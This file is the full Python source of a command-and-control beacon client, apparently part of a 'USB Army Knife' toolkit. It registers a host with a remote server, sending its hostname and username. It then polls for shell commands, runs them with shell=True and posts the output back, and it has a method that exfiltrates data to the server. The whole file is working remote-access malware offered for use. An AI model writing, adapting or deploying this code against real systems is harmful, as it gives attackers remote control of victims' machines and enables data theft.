#!/usr/bin/env python3
"""
USB Army Knife C2 Beacon Client
Connects back to C2 server and executes commands
"""

import os
import sys
import time
import json
import socket
import subprocess
import platform
import hashlib
import base64
from urllib import request, error
from datetime import datetime

class BeaconClient:
    """C2 Beacon Client"""
    
    def __init__(self, c2_url, beacon_id=None, sleep_time=60):
        self.c2_url = c2_url.rstrip('/')
        self.sleep_time = sleep_time
        self.beacon_id = beacon_id or self._generate_beacon_id()
        self.running = True
    
    def _generate_beacon_id(self):
        """Generate unique beacon ID"""
        hostname = platform.node()
        username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
        unique = f"{hostname}{username}{time.time()}"
        return hashlib.md5(unique.encode()).hexdigest()
    
    def _get_system_info(self):
        """Collect system information"""
        return {
            'hostname': platform.node(),
            'username': os.getenv('USER') or os.getenv('USERNAME'),
            'os': platform.system(),
            'os_version': platform.release(),
            'architecture': platform.machine(),
            'python_version': platform.python_version()
        }
    
    def _http_request(self, endpoint, method='GET', data=None):
        """Make HTTP request to C2 server"""
        url = f"{self.c2_url}{endpoint}"
        
        try:
            if method == 'GET':
                req = request.Request(url)
                with request.urlopen(req, timeout=10) as response:
                    return json.loads(response.read().decode())
            
            elif method == 'POST':
                headers = {'Content-Type': 'application/json'}
                req = request.Request(url, 
                                    data=json.dumps(data).encode(), 
                                    headers=headers, 
                                    method='POST')
                with request.urlopen(req, timeout=10) as response:
                    return json.loads(response.read().decode())
        
        except error.URLError as e:
            return {'error': str(e)}
        except Exception as e:
            return {'error': str(e)}
    
    def register(self):
        """Register beacon with C2 server"""
        sys_info = self._get_system_info()
        data = {
            'beacon_id': self.beacon_id,
            'hostname': sys_info['hostname'],
            'username': sys_info['username'],
            'os': sys_info['os'],
            'metadata': sys_info
        }
        
        result = self._http_request('/api/beacon/register', 'POST', data)
        return result.get('status') == 'success'
    
    def checkin(self):
        """Check in with C2 server and get commands"""
        result = self._http_request(f'/api/beacon/checkin/{self.beacon_id}', 'POST', {})
        
        if result.get('status') == 'success':
            return result.get('commands', [])
        return []
    
    def execute_command(self, command):
        """Execute shell command"""
        try:
            if platform.system() == 'Windows':
                shell = True
            else:
                shell = True
            
            result = subprocess.run(
                command,
                shell=shell,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]\n{result.stderr}"
            
            return output or "[Command executed with no output]"
        
        except subprocess.TimeoutExpired:
            return "[ERROR] Command timeout"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def send_result(self, command_id, result):
        """Send command result back to C2"""
        data = {'result': result}
        return self._http_request(f'/api/beacon/result/{command_id}', 'POST', data)
    
    def exfiltrate_data(self, data, filename='data.txt', data_type='text'):
        """Exfiltrate data to C2 server"""
        payload = {
            'filename': filename,
            'data': data,
            'type': data_type
        }
        return self._http_request(f'/api/beacon/exfil/{self.beacon_id}', 'POST', payload)
    
    def run(self):
        """Main beacon loop"""
        print(f"[*] Beacon starting...")
        print(f"[*] Beacon ID: {self.beacon_id}")
        print(f"[*] C2 Server: {self.c2_url}")
        print(f"[*] Sleep time: {self.sleep_time}s\n")
        
        # Register with C2
        if not self.register():
            print("[!] Failed to register with C2 server")
            return
        
        print("[+] Successfully registered with C2 server")
        print("[*] Entering beacon loop...\n")
        
        while self.running:
            try:
                # Check in for commands
                commands = self.checkin()
                
                if commands:
                    print(f"[+] Received {len(commands)} command(s)")
                    
                    for cmd in commands:
                        cmd_id = cmd['id']
                        cmd_text = cmd['command']
                        
                        print(f"[*] Executing: {cmd_text}")
                        
                        # Execute command
                        result = self.execute_command(cmd_text)
                        
                        # Send result back
                        self.send_result(cmd_id, result)
                        print(f"[+] Result sent for command {cmd_id}")
                
                # Sleep before next check-in
                time.sleep(self.sleep_time)
            
            except KeyboardInterrupt:
                print("\n[*] Beacon stopped by user")
                self.running = False
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(self.sleep_time)

def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='USB Army Knife C2 Beacon')
    parser.add_argument('c2_url', help='C2 server URL (e.g. http://192.168.1.100:8443)')
    parser.add_argument('--sleep', type=int, default=60, help='Sleep time between check-ins (seconds)')
    parser.add_argument('--beacon-id', help='Custom beacon ID (optional)')
    
    args = parser.parse_args()
    
    beacon = BeaconClient(
        c2_url=args.c2_url,
        beacon_id=args.beacon_id,
        sleep_time=args.sleep
    )
    
    beacon.run()

if __name__ == '__main__':
    main()
